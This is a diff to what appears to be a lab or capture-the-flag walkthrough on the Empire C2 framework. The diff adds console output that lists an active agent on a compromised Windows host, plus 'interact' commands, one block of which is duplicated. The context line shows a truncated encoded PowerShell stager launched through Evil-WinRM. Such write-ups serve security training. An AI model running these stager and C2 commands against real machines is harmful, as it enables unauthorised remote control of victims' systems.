@@ -348,6 +348,30 @@ Evil-WinRM* PS C:\Users\Sam\Documents> powershell -noP -sta -w 1 -enc  SQBG...
 <p>6.1. Which process may work with psinject?. Hint : This process is the user shell, which we see as the familiar taskbar, desktop, and other user interface features.<br>
 <code>No answer needed</code></p>
 
+```bash
+Empire: stager/multi/launcher) > agents
+
+[*] Active agents:
+
+ Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+ ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+ 32H68BSD ps 0.0.0.0         DESKTOP-E920628   DESKTOP-E920628\Sam     powershell         4976   5/0.0    2025-09-17 xx:xx:xx  http    
+```
+
+<img width="1120" height="185" alt="image" src="https://github.com/user-attachments/assets/7327b2ce-0267-44d7-a83c-c6c640dda596" />
+
+```bash
+(Empire: agents) > interact 32H68BSD
+(Empire: 32H68BSD) > 
+```
+
+<img width="1119" height="97" alt="image" src="https://github.com/user-attachments/assets/3b371a9a-a174-4104-a30f-40b9ca76a01b" />
+
+```bash
+(Empire: agents) > interact 32H68BSD
+(Empire: 32H68BSD) > 
+```
+
 <img width="1133" height="514" alt="image" src="https://github.com/user-attachments/assets/e783289e-1e87-41b6-a42e-0234ec97b868" />
 
 <img width="1132" height="377" alt="image" src="https://github.com/user-attachments/assets/ffceff0c-94be-40fd-854f-e135d57ad357" />
